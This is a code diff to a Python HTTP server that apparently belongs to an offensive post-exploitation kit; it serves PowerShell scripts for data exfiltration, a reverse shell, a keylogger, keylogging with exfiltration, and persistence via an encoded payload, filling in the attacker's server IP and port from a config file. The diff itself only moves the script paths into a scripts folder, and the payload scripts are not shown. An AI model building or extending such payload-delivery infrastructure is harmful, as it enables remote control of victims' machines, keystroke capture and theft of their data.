@@ -23,10 +23,10 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         headers = self.headers
         if self.path == '/all':
             try:
-                file_to_open = open('client_exf.ps1','r').read()
+                file_to_open = open('scripts/client_exf.ps1','r').read()
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
-                file_to_open2 = open('client_rvs.ps1','r').read()
+                file_to_open2 = open('scripts/client_rvs.ps1','r').read()
                 file_to_open2 = file_to_open2.replace('SERVER_EXTERNAL_IP',config.reverseshell['SERVER_EXTERNAL_IP'])
                 file_to_open2 = file_to_open2.replace('SERVER_EXTERNAL_PORT',config.reverseshell['SERVER_EXTERNAL_PORT'])
                 self.send_response(200)
@@ -41,7 +41,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.wfile.write(b'Not Found')
         elif self.path == '/exf':
             try:
-                file_to_open = open('client_exf.ps1','r').read()
+                file_to_open = open('scripts/client_exf.ps1','r').read()
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                 self.send_response(200)
@@ -55,7 +55,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.wfile.write(b'Not Found')
 	elif self.path == '/klogger':
             try:
-                file_to_open = open('client_logger.ps1','r').read()
+                file_to_open = open('scripts/client_logger.ps1','r').read()
 		file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
@@ -68,7 +68,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.wfile.write(b'Not Found')
 	elif self.path == '/klogger_exf':
             try:
-                file_to_open = open('client_logger_exf.ps1','r').read()
+                file_to_open = open('scripts/client_logger_exf.ps1','r').read()
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
 		file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
@@ -83,7 +83,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.wfile.write(b'Not Found')
         elif self.path == '/rvs':
             try:
-                file_to_open = open('client_rvs.ps1','r').read()
+                file_to_open = open('scripts/client_rvs.ps1','r').read()
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.reverseshell['SERVER_EXTERNAL_IP'])
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.reverseshell['SERVER_EXTERNAL_PORT'])
                 self.send_response(200)
@@ -97,7 +97,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.wfile.write(b'Not Found')
         elif self.path == '/pers':
             try:
-                file_to_open = open('client_pers.ps1','r').read()
+                file_to_open = open('scripts/client_pers.ps1','r').read()
                 file_to_open = file_to_open.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',config.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
